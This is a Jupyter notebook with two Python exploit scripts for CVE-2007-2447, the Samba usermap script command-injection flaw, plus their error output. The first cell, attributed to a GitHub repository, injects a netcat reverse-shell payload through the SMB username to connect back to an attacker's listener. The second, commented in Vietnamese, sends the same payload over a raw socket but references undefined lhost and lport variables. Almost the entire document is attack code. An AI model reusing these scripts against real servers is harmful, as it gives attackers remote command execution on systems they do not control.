{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'smb'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "\u001b[1;32md:\\Python\\hello.ipynb Cell 1\u001b[0m line \u001b[0;36m8\n\u001b[0;32m      <a href='vscode-notebook-cell:/d%3A/Python/hello.ipynb#W0sZmlsZQ%3D%3D?line=0'>1</a>\u001b[0m \u001b[39m#!/usr/bin/python\u001b[39;00m\n\u001b[0;32m      <a href='vscode-notebook-cell:/d%3A/Python/hello.ipynb#W0sZmlsZQ%3D%3D?line=1'>2</a>\u001b[0m \u001b[39m# -*- coding: utf-8 -*-\u001b[39;00m\n\u001b[0;32m      <a href='vscode-notebook-cell:/d%3A/Python/hello.ipynb#W0sZmlsZQ%3D%3D?line=2'>3</a>\u001b[0m \n\u001b[0;32m      <a href='vscode-notebook-cell:/d%3A/Python/hello.ipynb#W0sZmlsZQ%3D%3D?line=3'>4</a>\u001b[0m \u001b[39m# From : https://github.com/amriunix/cve-2007-2447\u001b[39;00m\n\u001b[0;32m      <a href='vscode-notebook-cell:/d%3A/Python/hello.ipynb#W0sZmlsZQ%3D%3D?line=4'>5</a>\u001b[0m \u001b[39m# case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/\u001b[39;00m\n\u001b[0;32m      <a href='vscode-notebook-cell:/d%3A/Python/hello.ipynb#W0sZmlsZQ%3D%3D?line=6'>7</a>\u001b[0m \u001b[39mimport\u001b[39;00m \u001b[39msys\u001b[39;00m\n\u001b[1;32m----> <a href='vscode-notebook-cell:/d%3A/Python/hello.ipynb#W0sZmlsZQ%3D%3D?line=7'>8</a>\u001b[0m \u001b[39mfrom\u001b[39;00m \u001b[39msmb\u001b[39;00m\u001b[39m.\u001b[39;00m\u001b[39mSMBConnection\u001b[39;00m \u001b[39mimport\u001b[39;00m SMBConnection\n\u001b[0;32m     <a href='vscode-notebook-cell:/d%3A/Python/hello.ipynb#W0sZmlsZQ%3D%3D?line=9'>10</a>\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39mexploit\u001b[39m(rhost, rport, lhost, lport):\n\u001b[0;32m     <a href='vscode-notebook-cell:/d%3A/Python/hello.ipynb#W0sZmlsZQ%3D%3D?line=10'>11</a>\u001b[0m         payload \u001b[39m=\u001b[39m \u001b[39m'\u001b[39m\u001b[39mmkfifo /tmp/hago; nc \u001b[39m\u001b[39m'\u001b[39m \u001b[39m+\u001b[39m lhost \u001b[39m+\u001b[39m \u001b[39m'\u001b[39m\u001b[39m \u001b[39m\u001b[39m'\u001b[39m \u001b[39m+\u001b[39m lport \u001b[39m+\u001b[39m \u001b[39m'\u001b[39m\u001b[39m 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago\u001b[39m\u001b[39m'\u001b[39m\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'smb'"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/python\n",
    "# -*- coding: utf-8 -*-\n",
    "\n",
    "# From : https://github.com/amriunix/cve-2007-2447\n",
    "# case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/\n",
    "\n",
    "import sys\n",
    "from smb.SMBConnection import SMBConnection\n",
    "\n",
    "def exploit(rhost, rport, lhost, lport):\n",
    "        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'\n",
    "        username = \"/=`nohup \" + payload + \"`\"\n",
    "        conn = SMBConnection(username, \"\", \"\", \"\")\n",
    "        try:\n",
    "            conn.connect(rhost, int(rport), timeout=1)\n",
    "        except:\n",
    "            print(\"[+] Payload was sent - check netcat !\")\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    print(\"[*] CVE-2007-2447 - Samba usermap script\")\n",
    "    if len(sys.argv) != 5:\n",
    "        print(\"[-] usage: python \" + sys.argv[0] + \" <RHOST> <RPORT> <LHOST> <LPORT>\")\n",
    "    else:\n",
    "        print(\"[+] Connecting !\")\n",
    "        rhost = sys.argv[1]\n",
    "        rport = sys.argv[2]\n",
    "        lhost = sys.argv[3]\n",
    "        lport = sys.argv[4]\n",
    "        exploit(rhost, rport, lhost, lport)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "usage: ipykernel_launcher.py [-h] [-payload PAYLOAD] rhost rport\n",
      "ipykernel_launcher.py: error: the following arguments are required: rhost, rport\n"
     ]
    },
    {
     "ename": "SystemExit",
     "evalue": "2",
     "output_type": "error",
     "traceback": [
      "An exception has occurred, use %tb to see the full traceback.\n",
      "\u001b[1;31mSystemExit\u001b[0m\u001b[1;31m:\u001b[0m 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\baopr\\AppData\\Roaming\\Python\\Python312\\site-packages\\IPython\\core\\interactiveshell.py:3585: UserWarning: To exit: use 'exit', 'quit', or Ctrl-D.\n",
      "  warn(\"To exit: use 'exit', 'quit', or Ctrl-D.\", stacklevel=1)\n"
     ]
    }
   ],
   "source": [
    "import socket\n",
    "import argparse\n",
    "\n",
    "# Khởi tạo và parse các đối số dòng lệnh\n",
    "parser = argparse.ArgumentParser(description='Exploit script for CVE-2007-2447')\n",
    "parser.add_argument('rhost', help='Remote host IP address')\n",
    "parser.add_argument('rport', type=int, help='Remote port')\n",
    "parser.add_argument('-payload', help='Payload type: python, netcat, bash')\n",
    "args = parser.parse_args()\n",
    "\n",
    "# Khởi tạo kết nối socket\n",
    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "\n",
    "# Kết nối đến máy chủ đích\n",
    "try:\n",
    "    s.connect((args.rhost, args.rport))\n",
    "except Exception as e:\n",
    "    print(f\"Connection to target failed... {e}\")\n",
    "    exit()\n",
    "\n",
    "# Gửi payload tới máy chủ\n",
    "if args.payload == 'bash':\n",
    "    try:\n",
    "        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'\n",
    "        s.sendall((f'AB; {payload} \\n').encode())\n",
    "        print('Payload sent successfully!')\n",
    "    except Exception as e:\n",
    "        print(f'Failed to send payload: {e}')\n",
    "        exit()\n",
    "\n",
    "# Nhận và xử lý phản hồi từ máy chủ\n",
    "try:\n",
    "    data = s.recv(1024)\n",
    "    print(f\"Received data: {data}\")\n",
    "except Exception as e:\n",
    "    print(f'Error receiving data: {e}')\n",
    "\n",
    "# Đóng kết nối\n",
    "s.close()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
